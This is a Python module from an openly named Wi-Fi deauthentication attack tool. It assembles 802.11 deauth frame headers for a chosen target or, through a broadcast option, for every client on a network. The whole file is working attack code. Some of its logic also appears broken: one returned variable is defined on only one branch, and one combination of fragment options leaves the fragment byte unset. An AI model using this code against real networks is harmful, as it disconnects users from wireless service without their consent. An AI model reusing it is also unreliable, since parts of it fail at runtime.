# OkeusStrike - Advanced Deauthentication Attack Tool - assemble.py
# Copyright (C) 2025 Richard Smith (Islc12)
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see <https://www.gnu.org/licenses/>.

import struct
import sys
from . import exit
from . import convert

def f_assem(dest_mac=None, broadcast_attack=False, source_mac=None, network_bssid=None, frag=None, dur=None, randfrag=False):
    # starts the 80211 mac header, deauth frame byte
    f_ctl = struct.pack('B', 0xC0)

    # second byte makeup of FCF
    match (frag, randfrag):
        case (None, False):
            f_frag = struct.pack('B', 0x00)
            ch = "DEFAULT"
        case (_, False):
            f_frag = struct.pack('B', 0x20)
            ch = "MANUAL"
        case (None, True):
            f_frag = struct.pack('B', 0x20)
            ch =  "RANDOM"

    # Duration field
    match dur:
        case None:
            f_dur = struct.pack('<H', 0x00)
        case _:
            f_dur = struct.pack('<H', dur & 0xFFFF)

    # Address 1 field
    match (dest_mac, broadcast_attack):
        case (None, False):
            print("Invalid input, need address 1 field")
            sys.exit(exit.EXIT_NO_TARGET)
        case (None, True):
            ct = struct.pack('!6B', 0xFF, 0XFF, 0XFF, 0XFF, 0XFF, 0XFF)
        case (_, False):
            ct = convert.machex(dest_mac)
        case (_, True):
            print("Invalid arguments, too many addresses in Address 1")
            sys.exit(exit.EXIT_TOO_MANY_ADDR1)            

    # Address 2 field, if not given Address 3 fills
    match source_mac:
        case None:
            src = convert.machex(network_bssid)
            src_n_v = "Source Address (Address 2) field will use Network Address (Address 3 field)"
        case _:
            src = convert.machex(source_mac)

    # Address 3 field
    match network_bssid:
        case None:
            print("Invalid argument, missing Address 3")
            sys.exit(exit.EXIT_NO_NETWORKBSSID)
        case _:
            net = convert.machex(network_bssid)

    return f_ctl, f_frag, f_dur, ct, src, net, ch, src_n_v